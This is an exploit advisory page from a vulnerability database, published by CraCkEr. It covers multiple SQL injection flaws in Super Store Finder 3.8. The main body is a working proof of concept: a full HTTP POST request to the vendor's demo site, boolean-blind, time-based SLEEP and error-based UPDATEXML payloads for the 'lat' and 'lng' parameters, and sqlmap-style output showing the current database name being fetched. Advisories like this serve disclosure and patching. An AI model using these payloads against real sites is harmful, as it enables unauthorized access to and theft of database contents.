---
title: Super Store Finder 3.8 - Multiple SQL Injection
url: https://cxsecurity.com/issue/WLB-2026110004
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-11-11
fetch_date: 2026-11-12T09:00:46.481924
---

# Super Store Finder 3.8 - Multiple SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Super Store Finder 3.8 - Multiple SQL Injection** **2026.11.11**  Credit:  **[CraCkEr](https://cxsecurity.com/author/CraCkEr/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-108541](https://cxsecurity.com/cveshow/CVE-2026-108541/ "Click to see CVE-2026-108541")**  CWE: **[CWE-89 - CWE-74 - CWE-707](https://cxsecurity.com/cwe/CWE-89%20-%20CWE-74%20-%20CWE-707 "Click to see CWE-89 - CWE-74 - CWE-707")** | |

# Exploit Title: Super Store Finder 3.8 - Multiple SQL Injection
# Exploit Author: CraCkEr
# Date: 26/08/2026
# Vendor: highwarden
# Vendor Homepage: https://codecanyon.net/item/super-store-finder/3630922
# Software Link: https://superstorefinder.net/products/superstorefinder/index.php
# Tested on: Windows 11 Pro
# Impact: Database Access
# CVE: CVE-2026-108541
# VDB: VDB-416196
## Description
SQL injection attacks can allow unauthorized access to sensitive data, modification of
data and crash the application or make it unavailable, leading to lost revenue and
damage to a company's reputation.
Path: /products/superstorefinder/index.php
POST parameter 'lat' is vulnerable to SQLI
POST parameter 'lng' is vulnerable to SQLI
## HTTP Request
```
POST /products/superstorefinder/index.php HTTP/1.1
Host: superstorefinder.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: \*/\*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 88
Origin: https://superstorefinder.net
Referer: https://superstorefinder.net/products/superstorefinder/index.php
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
ajax=1&action=get\_nearby\_stores&distance=1&lat=[SQLI]&lng=[SQLI]&products=1
```
## PoC:
[+] current database
---
Parameter: lat (POST)
Type: boolean-based blind
Title: Boolean-based blind - Parameter replace
Payload: ajax=1&action=get\_nearby\_stores&distance=200&lat=(SELECT (CASE WHEN (06657=6657) THEN 03586 ELSE 3\*(SELECT 2 UNION ALL SELECT 1) END))&lng=-74.0059728&products=347
Type: time-based blind
Title: MySQL >= 5.0.12 time-based blind (query SLEEP)
Payload: ajax=1&action=get\_nearby\_stores&distance=200&lat=(SELECT(0)FROM(SELECT(SLEEP(8)))a)&lng=-74.0059728&products=347
Parameter: lng (POST)
Type: error-based
Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)
Payload: ajax=1&action=get\_nearby\_stores&distance=200&lat=40.7127753&lng=-74.0059728AND UPDATEXML(0,CONCAT\_WS(0x28,0x7e,0x72306f746833783439,0x7e),0)&products=347
Type: boolean-based blind
Title: Boolean-based blind - Parameter replace
Payload: ajax=1&action=get\_nearby\_stores&distance=200&lat=40.7127753&lng=(SELECT (CASE WHEN (02949=2949) THEN 03586 ELSE 3\*(SELECT 2 UNION ALL SELECT 1) END))&products=347
Type: time-based blind
Title: MySQL >= 5.0.12 time-based blind (query SLEEP)
Payload: ajax=1&action=get\_nearby\_stores&distance=200&lat=40.7127753&lng=(SELECT(0)FROM(SELECT(SLEEP(5)))a)&products=347
---
[14:04:43] [INFO] testing MySQL
[14:04:43] [INFO] confirming MySQL
[14:04:43] [INFO] the back-end DBMS is MySQL
[14:04:43] [INFO] fetching current database
[14:04:43] [INFO] resumed: '\*\*\*\*\*\*\*\*\*\_\*\*\*'
current database: '\*\*\*\*\*\*\*\*\*\_\*\*\*'
[-] Done

**##### References:**

https://vuldb.com/vuln/416196

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026110004)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top